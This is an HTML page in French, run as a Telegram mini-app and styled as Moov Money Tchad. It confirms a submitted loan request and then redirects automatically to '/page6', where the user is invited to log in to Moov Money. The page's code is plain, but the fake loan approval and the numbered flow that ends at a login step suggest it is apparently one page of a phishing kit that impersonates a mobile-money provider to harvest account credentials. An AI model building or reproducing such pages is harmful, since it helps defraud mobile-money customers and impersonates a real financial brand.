<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Demande Soumise - Moov Money Tchad</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --moov-orange: #ff6600;
            --moov-blue: #0044cc;
            --bg-color: #f0f4f8;
            --card-bg: #ffffff;
        }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        
        .card { background: var(--card-bg); width: 90%; max-width: 420px; padding: 40px 24px 35px; border-radius: 24px; box-shadow: 0 6px 25px rgba(0,68,204,0.08); display: flex; flex-direction: column; align-items: center; text-align: center; }
        .check-circle { width: 88px; height: 88px; background-color: var(--moov-orange); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 28px; color: white; font-size: 38px; font-weight: bold; }
        .main-title { font-size: 26px; color: var(--moov-blue); margin: 0 0 20px; font-weight: 800; }
        .message-text { color: #555; font-size: 15px; margin: 0 0 16px; line-height: 1.55; }
        .redirect-box { background-color: #f5f8ff; border-radius: 12px; padding: 16px 20px; margin: 20px 0 16px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 10px; color: var(--moov-blue); font-weight: 700; }
        .spinner { width: 18px; height: 18px; border: 2.5px solid #bfdbfe; border-top: 2.5px solid var(--moov-blue); border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn-outline { background-color: transparent; color: #333; border: 1px solid #cbd5e1; width: 100%; padding: 14px; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>

<div class="card">
    <div class="check-circle">✓</div>
    <h1 class="main-title">Demande Soumise</h1>
    <p class="message-text">Votre demande de prêt a été enregistrée avec succès. Veuillez patienter pendant l'approbation.</p>
    
    <div class="redirect-box">
        <div class="spinner"></div>
        <span>Redirection dans <span id="timer">3</span>s...</span>
    </div>

    <button type="button" class="btn-outline" onclick="window.location.href='/page6'">Se connecter à Moov Money</button>
</div>

<script>
    let timeLeft = 3;
    const interval = setInterval(() => {
        timeLeft--;
        document.getElementById('timer').textContent = timeLeft;
        if (timeLeft <= 0) {
            clearInterval(interval);
            window.location.href = "/page6";
        }
    }, 1000);

    window.onload = () => { if (window.Telegram?.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); } };
</script>
</body>
</html>
